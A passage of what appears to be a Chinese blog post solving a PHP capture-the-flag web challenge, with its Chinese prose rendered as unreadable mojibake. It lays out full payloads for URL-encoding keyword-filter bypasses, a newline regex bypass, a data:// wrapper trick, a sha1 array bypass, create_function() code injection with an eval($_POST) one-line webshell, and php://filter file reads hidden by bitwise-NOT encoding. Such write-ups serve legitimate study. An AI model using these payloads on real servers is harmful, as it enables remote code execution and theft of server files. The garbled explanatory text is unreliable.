<span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br><span class="line">This is a very simple challenge <span class="keyword">and</span> <span class="keyword">if</span> you solve it I will give you a flag. Good Luck!</span><br><span class="line">fxck you! I hate English!</span><br></pre></td></tr></table></figure><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>â€‹    å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¦‚æœéœ€è¦æ‹¿åˆ°flagå°±è¦ç©¿è¿‡6ä¸ªifã€‚æ®å‡ºé¢˜äººçš„è¯´æ³•ï¼Œæœ¬é¢˜è€ƒå¯Ÿçš„æ˜¯create_function()å‡½æ•°ã€‚é¢˜ç›®æˆ‘çœ‹äº†ã€‚çœ‹ä¸æ‡‚ã€‚æ—¢ç„¶è€ƒå¯Ÿçš„æ˜¯create_function()ã€‚çŸ¥è¯†ç‚¹ä¹Ÿåœ¨æˆ‘ä»¬èƒ½åŠ›èŒƒç•´ä¹‹å¤–ã€‚å› æ­¤è·Ÿç€å‡ºé¢˜äººçš„WPå¤ç°äº†ä¸€æ³¢ã€‚</p><h3 id="æ ¸å¿ƒè€ƒç‚¹ï¼šCreate-function"><a href="#æ ¸å¿ƒè€ƒç‚¹ï¼šCreate-function" class="headerlink" title="æ ¸å¿ƒè€ƒç‚¹ï¼šCreate_function()"></a>æ ¸å¿ƒè€ƒç‚¹ï¼šCreate_function()</h3><p>ç”¨æ³•å¦‚ä¸‹ã€‚ç”¨äºåˆ›å»ºä¸€ä¸ªæ–¹æ³•ï¼Œå˜é‡åä¸ºæ–¹æ³•åï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–°æ–¹æ³•çš„å½¢å‚ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ–°æ–¹æ³•çš„å†…å®¹ã€‚</p><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/OrqZbF4fexNQSwR.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916203131193"></p><p>ç”±äºé¢˜ç›®ä¸­æˆ‘ä»¬çš„codeæ˜¯å¯æ§çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$myFunc</span> = create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return ($a+$b);&#125;eval($_POST[1]);\\&#x27;</span>)</span><br><span class="line">    <span class="comment">#å¦‚æ­¤ä¸€æ¥æ‰§è¡Œçš„myFuncå°±å˜æˆäº†</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$a</span>+<span class="variable">$b</span>);&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);\\</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå¯ä»¥çœ‹è§æˆ‘ä»¬æˆåŠŸåµŒå…¥äº†ä¸€æ®µä¸€å¥è¯æœ¨é©¬ã€‚</p><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/15/mYqgNIuWMd4vi5e.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210822165828641"></p><p>â€‹    </p><h3 id="è€ƒç‚¹1ï¼šç»•è¿‡QUERY-STRINGçš„æ­£åˆ™åŒ¹é…"><a href="#è€ƒç‚¹1ï¼šç»•è¿‡QUERY-STRINGçš„æ­£åˆ™åŒ¹é…" class="headerlink" title="è€ƒç‚¹1ï¼šç»•è¿‡QUERY_STRINGçš„æ­£åˆ™åŒ¹é…"></a>è€ƒç‚¹1ï¼šç»•è¿‡QUERY_STRINGçš„æ­£åˆ™åŒ¹é…</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br></pre></td></tr></table></figure><p>phpä¸­å› ä¸º$_SERVER[â€˜QUERY_STRINGâ€™]ä¸ä¼šè¿›è¡Œurldecodeï¼Œè€Œ$_GET[]ä¼šè¿›è¡Œè§£ç ã€‚å› æ­¤æˆ‘ä»¬é€šè¿‡urlencodeç»•è¿‡è¯¥æ­£åˆ™åŒ¹é…ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1:?file=</span><br></pre></td></tr></table></figure><h3 id="è€ƒç‚¹2ï¼šç»•è¿‡aqua-is-cuteçš„æ­£åˆ™åŒ¹é…"><a href="#è€ƒç‚¹2ï¼šç»•è¿‡aqua-is-cuteçš„æ­£åˆ™åŒ¹é…" class="headerlink" title="è€ƒç‚¹2ï¼šç»•è¿‡aqua_is_cuteçš„æ­£åˆ™åŒ¹é…"></a>è€ƒç‚¹2ï¼šç»•è¿‡aqua_is_cuteçš„æ­£åˆ™åŒ¹é…</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯^.+$å½¢å¼çš„æ­£åˆ™åŒ¹é…ã€‚é‚£ä¹ˆç›´æ¥ä½¿ç”¨æ¢è¡Œç¬¦%0aç»•è¿‡ã€‚å› ä¸ºdebu,auqa,cuteåœ¨ç¬¬ä¸€ä¸ªIfä¸­ã€‚å› æ­¤å¯¹ä»–ä¸‰ä¸ªè¿›è¡Œurlencode.</p><p>æ³¨æ„è¿™é‡Œçš„%0aæ˜¯ç”¨æ¥æ»¡è¶³debu!==aqua_is_cuteã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2:debu=aqua_is_cute%<span class="number">0</span>a==&gt;%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><h3 id="è€ƒç‚¹3ï¼šç»•è¿‡-REQUESTçš„å­—æ¯åŒ¹é…ã€‚"><a href="#è€ƒç‚¹3ï¼šç»•è¿‡-REQUESTçš„å­—æ¯åŒ¹é…ã€‚" class="headerlink" title="è€ƒç‚¹3ï¼šç»•è¿‡$_REQUESTçš„å­—æ¯åŒ¹é…ã€‚"></a>è€ƒç‚¹3ï¼šç»•è¿‡$_REQUESTçš„å­—æ¯åŒ¹é…ã€‚</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) </span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯é€šè¿‡æ•°ç»„éå†çš„æ–¹å¼ï¼Œæ¥è¿›è¡Œæ­£åˆ™åŒ¹é…ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ã€‚</p><p>çŸ¥è¯†ç‚¹æ˜¯ï¼Œåœ¨postå’ŒgetåŒæ—¶å­˜åœ¨æ—¶ï¼Œrequestæå–postæ•°æ®çš„ä¼˜å…ˆçº§é«˜äºgetã€‚å› æ­¤æˆ‘ä»¬postç»™file=1&amp;debu=1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:debu=aqua_is_cute%<span class="number">0</span>a&amp;file=</span><br><span class="line">urlencde:%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a&amp;file=</span><br><span class="line"></span><br><span class="line">POST:file=<span class="number">1</span>&amp;debu=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="è€ƒç‚¹4ï¼šç»•è¿‡æ–‡ä»¶å†…å®¹è¯»å–çš„æ¯”è¾ƒ"><a href="#è€ƒç‚¹4ï¼šç»•è¿‡æ–‡ä»¶å†…å®¹è¯»å–çš„æ¯”è¾ƒ" class="headerlink" title="è€ƒç‚¹4ï¼šç»•è¿‡æ–‡ä»¶å†…å®¹è¯»å–çš„æ¯”è¾ƒ"></a>è€ƒç‚¹4ï¼šç»•è¿‡æ–‡ä»¶å†…å®¹è¯»å–çš„æ¯”è¾ƒ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å› ä¸ºfile_get_contentsçš„ç‰¹æ€§ã€‚æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨phpä¼ªåè®®æ¥ç»•è¿‡è¿™ä¸ªç‚¹ã€‚å› ä¸ºdebu_debu_aquaåœ¨ç¬¬ä¸€ä¸ªifä¸­ã€‚æ‰€ä»¥Urlencode</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload4ï¼š    GET:debu=aqua_is_cute&amp;file=data:<span class="comment">//text/plain,base64,debu_debu_aquaurlencncode:file=data://text/plain,%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0aPOST:file=1&amp;debu=1</span></span><br></pre></td></tr></table></figure><p>data://text/plain;base64,debu_debu_aqua</p><h3 id="è€ƒç‚¹5ï¼šç»•è¿‡sha1æ¾æ•£æ¯”è¾ƒ"><a href="#è€ƒç‚¹5ï¼šç»•è¿‡sha1æ¾æ•£æ¯”è¾ƒ" class="headerlink" title="è€ƒç‚¹5ï¼šç»•è¿‡sha1æ¾æ•£æ¯”è¾ƒ"></a>è€ƒç‚¹5ï¼šç»•è¿‡sha1æ¾æ•£æ¯”è¾ƒ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )</span><br></pre></td></tr></table></figure><p>å› ä¸ºsha1æ— æ³•å¤„ç†æ•°ç»„ï¼Œå› æ­¤æˆ‘ä»¬é€šè¿‡æ•°ç»„ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload5:GET:debu=aqua_is_cute&amp;file=data:<span class="comment">//text/plain;base64,debu_debu_aqua&amp;shanap[]=1&amp;passwd[]=2urlencode:file=data://text/plain,%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6E%61[]=1&amp;%70%61%73%73%77%64[]=2POST:file=1&amp;debu=1</span></span><br></pre></td></tr></table></figure><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function:"></a>create_function:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123;     <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); &#125; <span class="keyword">else</span> &#123;     <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); &#125;</span><br></pre></td></tr></table></figure><p>â€‹    å‰é¢éƒ½ç»•è¿‡äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬è¦å¦‚ä½•å»è¯»åˆ°è¿™ä¸ªflagå‘¢ã€‚é¦–å…ˆå¯ä»¥çœ‹åˆ°æ–‡ä»¶ä¸­æœ‰åŒ…å«flag.phpã€‚é‚£ä¹ˆä¸€å®šå­˜åœ¨$flagå˜é‡ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯»å–å˜é‡çš„æ–¹å¼.ä½¿ç”¨get_defined_vars()ã€‚å†æ ¹æ®create_functionã€‚å› ä¸ºcodeåšäº†å¾ˆå¤šè¿‡æ»¤ã€‚æˆ‘ä»¬å¯ä»¥æƒ³åˆ°ç”¨å­—æ¯æ•°å­—çš„webshellã€‚å†çœ‹é¢˜ç›®ä¸Šæ˜¯$code(â€˜ â€˜,$arg);è¿™é‡Œæˆ‘ä»¬çš„ä¸¤ä¸ªç‚¹éƒ½å¯æ§ã€‚</p><p>$code=create_function&amp;$arg=}var_dump(get_defined_vars());\</p><p>å› ä¸ºcode,å’Œargéƒ½åœ¨ç¬¬ä¸€ä¸ªifä¸­ã€‚æ‰€ä»¥è¿›è¡Œurlencode</p><h2 id="æœ€ç»ˆpayload"><a href="#æœ€ç»ˆpayload" class="headerlink" title="æœ€ç»ˆpayload:"></a>æœ€ç»ˆpayload:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET:debu=aqua_is_cute&amp;file=data:<span class="comment">//text/plain;base64,debu_debu_aqua&amp;shanap[]=1&amp;passwd[]=2urlencode:file=data://text/plain,%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6E%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6C%61%67[%63%6F%64%65]=create_function&amp;%66%6C%61%67[%61%72%67]=&#125;var_dump(get_defined_vars());//POST:file=1&amp;debu=1</span></span><br></pre></td></tr></table></figure><p>â€‹    <img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/15/Gf3J9lIarwO587x.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210822190836089"></p><p>å¯æ¶ï¼ç»™å‡ºäº†çœŸå®flagçš„ä½ç½®1fl4g.phpã€‚é‚£ä¹ˆæˆ‘ä»¬ç»§ç»­æƒ³åŠæ³•å»è¯»è¿™ä¸ªæ–‡ä»¶ã€‚</p><p>æ ¹æ®ä¸Šé¢çš„get_defined_vars();é‚£ä¹ˆå¾ˆå®¹æ˜“æƒ³åˆ°æˆ‘ä»¬æŠŠè¿™ä¸ªrea1fl4g.phpä¹ŸåŒ…å«è¿›æ¥ã€‚</p><p>require(rea1fl4g.php);</p><p>å‘ç°ä¹Ÿè¯»ä¸åˆ°æºç </p><p>åŸé¢˜ç›®çš„é¢„æœŸè§£æ˜¯è¿™ä¸ªã€‚ä½†æ˜¯åŠ äº†base64_decodeæ¥è§£ç ã€‚å› ä¸ºcodeè¢«Banäº†ã€‚é‚£ä¹ˆç»§ç»­å¯¹base64_decodeè¿›è¡Œurlencode</p><p>åŸé¢˜ç›®payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET:file=data:<span class="comment">//text/plain,%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6E%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6C%61%67[%63%6F%64%65]=create_function&amp;%66%6C%61%67[%61%72%67]=&#125;require(%62%61%73%65%36%34%5F%64%65%63%6F%64%65(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//POST:file=1&amp;debu=1</span></span><br></pre></td></tr></table></figure><h2 id="æœ¬é¢˜payload"><a href="#æœ¬é¢˜payload" class="headerlink" title="æœ¬é¢˜payload:"></a>æœ¬é¢˜payload:</h2><p>â€‹    å› ä¸º~æ²¡æœ‰è¢«è¿‡æ»¤ã€‚é‚£ä¹ˆå¯ä»¥è¿›è¡Œå–åæ„é€ php://filterä¼ªåè®®æ¥è¯»å–flag.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=rea1fl4g.phpGET:file=data://text/plain,%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6E%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6C%61%67[%63%6F%64%65]=create_function&amp;%66%6C%61%67[%61%72%67]=&#125;require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//POST:file=1&amp;debu=1</span></span><br></pre></td></tr></table></figure><p>å”¯ä¸€ä¸€ä¸ªæˆ‘çœ‹å¾—æ‡‚çš„éé¢„æœŸè§£ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET:file=data:<span class="comment">//text/plain,%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6E%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6C%61%67[%63%6F%64%65]=create_function&amp;%66%6C%61%67[%61%72%67]=&#125;var_dump(require(end(pos(get_defined_vars()))));//&amp;k1he=%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%72%65%61%64%3D%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%65%6E%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%72%65%61%31%66%6C%34%67%2E%70%68%70POST:file=1&amp;debu=2&amp;k1he=1</span></span><br></pre></td></tr></table></figure><p>ä¸»è¦çœ‹è¿™ä¸ªflag[code]=}var_dump(require(end(pos(get_defined_vars()))));//</p><p>å› ä¸ºpos()å–å†…éƒ¨æŒ‡é’ˆçš„é¦–ä¸ªå…ƒç´ ï¼Œå¾—åˆ°ä¸€ä¸ªæˆ‘ä»¬ä¼ å‚çš„GETæ•°ç»„<img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/15/VDUedwYqFmWIixS.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210822204452173"></p><p>å¯ä»¥çœ‹è§æˆ‘ä»¬åœ¨ä¼ å‚k1he=phpä¼ªåè®®ä»¥åï¼Œè¿™ä¸ªæ•°ç»„ä¸­æœ‰äº†è¿™ä¸ªä¸œè¥¿ã€‚</p><p>ç„¶ååˆ©ç”¨end()å–è¿™ä¸ªæ•°ç»„çš„æœ€åä¸€ä¸ªæ•°ï¼Œé‚£ä¸å°±æ˜¯æˆ‘ä»¬çš„ä¼ªåè®®å—ã€‚</p><p>é‚£ä¹ˆå°±ç­‰ä»·äºäº†ä¸€ä¸ªæ–‡ä»¶åŒ…å«ä¼ªåè®®ã€‚</p><p>åˆå› ä¸ºæˆ‘ä»¬çš„k1heä¸æ˜¯æ•°ç»„ï¼Œç»•ä¸è¿‡å…¨æ˜¯å­—æ¯çš„æ­£åˆ™åŒ¹é…ã€‚å› æ­¤ä¼ å‚é‡Œå†åŠ ä¸€ä¸ªk1he=1æ¥ç»•è¿‡ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF-web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
